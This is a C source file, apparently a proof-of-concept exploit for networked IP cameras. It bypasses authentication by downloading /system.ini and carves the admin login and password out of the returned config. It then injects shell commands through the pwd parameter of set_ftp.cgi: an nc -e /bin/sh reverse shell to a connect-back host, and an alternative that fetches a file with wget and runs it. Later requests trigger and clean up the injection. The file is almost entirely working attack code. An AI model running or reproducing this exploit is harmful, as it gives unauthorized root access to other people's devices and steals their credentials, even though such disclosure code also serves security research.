#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


#define CAM_PORT 80
#define REMOTE_HOST "192.168.1.1"
#define REMOTE_PORT "1337"
#define PAYLOAD_0 "GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(nc%20" REMOTE_HOST "+" REMOTE_PORT "%20-e/bin/sh)&dir=/&mode=PORT&upload_interval=0\r\n\r\n"
#define PAYLOAD_1 "GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%s&loginpas=%s\r\n\r\n"
#define PAYLOAD_2 "GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=passpasspasspasspasspasspasspasspass&dir=/&mode=PORT&upload_interval=0\r\n\r\n"


#define ALTERNATIVE_PAYLOAD_zero0 "GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(nc+" REMOTE_HOST "+" REMOTE_PORT "+-e/bin/sh)&dir=/&mode=PORT&upload_interval=0\r\n\r\n"
#define ALTERNATIVE_PAYLOAD_zero1 "GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%s&loginpas=%s&svr=192.168.1.1&port=21&user=ftp&pwd=$(wget+http://" REMOTE_HOST "/stufz&&./stuff)&dir=/&mode=PORT&upload_interval=0\r\n\r\n"

char *    creds(char  *argv,
                int   get_config);

int       rce(char    *argv,
              char    *id,
              char    attack[],
              char    desc[]);


int   main(int        argc,
           char       **argv,
           char       **envp)
{
  char                *id;

  printf("Camera 0day root RCE with connect-back @PierreKimSec\n\n");

  if (argc < 2)
  {
     printf("%s target\n", argv[0]);
     printf("%s target --get-config      will dump the configuration and exit\n", argv[0]);
     return (1);
  }

  if (argc == 2)
    printf("Please run `nc -vlp %s` on %s\n\n", REMOTE_PORT, REMOTE_HOST);

  if (argc == 3 && !strcmp(argv[2], "--get-config"))
    id = creds(argv[1], 1);
  else
    id = creds(argv[1], 0);
  
  if (id == NULL)
  {
    printf("exploit failed\n");
    return (1);
  }
  printf("done\n");

  printf("    login = %s\n", id);
  printf("    pass  = %s\n", id + 32);

  if (!rce(argv[1], id, PAYLOAD_0, "planting"))
    printf("done\n");
  sleep(1);
  if (!rce(argv[1], id, PAYLOAD_1, "executing"))
    printf("done\n");
  if (!rce(argv[1], id, PAYLOAD_2, "cleaning"))
    printf("done\n");
  if (!rce(argv[1], id, PAYLOAD_1, "cleaning"))
    printf("done\n");

  printf("[+] enjoy your root shell on %s:%s\n", REMOTE_HOST, REMOTE_PORT);

  return (0);
}


char *    creds(char  *argv,
                int   get_config)
{
  int                 sock;
  int                 n;
  struct sockaddr_in  serv_addr;
  char                buf[8192] = { 0 };
  char                *out;
  char                *tmp;
  char                payload[] = "GET /system.ini?loginuse&loginpas HTTP/1.0\r\n\r\n";
  int                 old_n;
  int                 n_total;


  sock = 0;
  n = 0;
  old_n = 0;
  n_total = 0;

  printf("[+] bypassing auth ... ");

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
    printf("Error while creating socket\n");
    return (NULL);
  }
     
  memset(&serv_addr, '0', sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(CAM_PORT);

  if (inet_pton(AF_INET, argv, &serv_addr.sin_addr) <= 0)
  {
    printf("Error while inet_pton\n");
    return (NULL);
  }

  if (connect(sock, (struct sockaddr *)&serv_addr , sizeof(serv_addr)) < 0)
  {
    printf("creds: connect failed\n");
    return (NULL);
  }

  if (send(sock, payload, strlen(payload) , 0) < 0)
  {
    printf("creds: send failed\n");
    return (NULL);
  }

  if (!(tmp = malloc(10 * 1024 * sizeof(char))))
    return (NULL);

  if (!(out = calloc(64, sizeof(char))))
    return (NULL);

  while ((n = recv(sock, buf, sizeof(buf), 0)) > 0)
  {
    n_total += n;
    if (n_total < 1024 * 10)
      memcpy(tmp + old_n, buf, n);
    if (n >= 0)
      old_n = n;
  }

  close(sock);

  /*
  [ HTTP HEADERS ]
  ...

  000????: 0000 0a0a 0a0a 01.. .... .... .... ....
                ^^^^ ^^^^ ^^
                Useful reference in the binary data
                in order to to find the positions of
                credentials
  ...
  ... 
  0000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
  00006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  00006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
  00006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
  ...

  NOTE: reference can be too:
  000????: 0006 0606 0606 0100 000a .... .... ....

  Other method: parse everything, find the "admin" string and extract the associated password
  by adding 31bytes after the address of 'a'[dmin].
  Works if the login is admin (seems to be this by default, but can be changed by the user)
  */

  if (get_config)
  {
    for (unsigned int j = 0; j < n_total && j < 10 * 1024; j++)
      printf("%c", tmp[j]);
    exit (0);
  }


  for (unsigned int j = 50; j < 10 * 1024; j++)
  {
     if (tmp[j - 4] == 0x0a &&
         tmp[j - 3] == 0x0a &&
         tmp[j - 2] == 0x0a &&
         tmp[j - 1] == 0x0a &&
         tmp[j]     == 0x01)
     {
       if (j + 170 < 10 * 1024)
       {
         strcat(out, &tmp[j + 138]);
         strcat(out + 32 * sizeof(char), &tmp[j + 170]);
         free(tmp);

         return (out);
       }
     }
  }

  free(tmp);

  return (NULL);
}

int       rce(char    *argv,
              char    *id,
              char    attack[],
              char    desc[])
{
  int                 sock;
  struct sockaddr_in  serv_addr;
  char                *payload;

  if (!(payload = calloc(512, sizeof(char))))
    return (1);

  sock = 0;

  printf("[+] %s payload ... ", desc);

  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  {
    printf("Error while creating socket\n");
    return (1);
  }
 
  memset(&serv_addr, '0', sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(CAM_PORT);

  if (inet_pton(AF_INET, argv, &serv_addr.sin_addr) <= 0)
  {
    printf("Error while inet_pton\n");
    return (1);
  }

  if (connect(sock, (struct sockaddr *)&serv_addr , sizeof(serv_addr)) < 0)
  {
    printf("rce: connect failed\n");
    return (1);
  }


  sprintf(payload, attack, id, id + 32);
  if (send(sock, payload, strlen(payload) , 0) < 0)
  {
    printf("rce: send failed\n");
    return (1);
  }

  return (0);
}
